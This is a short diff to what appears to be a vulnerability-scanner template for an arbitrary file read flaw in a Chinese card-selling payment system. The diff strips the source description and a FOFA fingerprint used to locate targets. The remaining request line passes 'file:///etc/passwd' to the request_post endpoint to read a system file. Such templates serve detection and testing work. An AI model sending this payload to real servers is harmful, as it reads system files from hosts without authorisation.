@@ -3,12 +3,8 @@ info:
   name: 鲸发卡系统 payxinhuirequest_post 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nmgc4euemnqkhedi'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nmgc4euemnqkhedi
-    fofa: body="/static/theme/maowang51/css/style.css"
 http:
 - raw:
   - 'GET /pay/xinhui/request_post?url=file:///etc/passwd&post_data[1]= HTTP/1.1
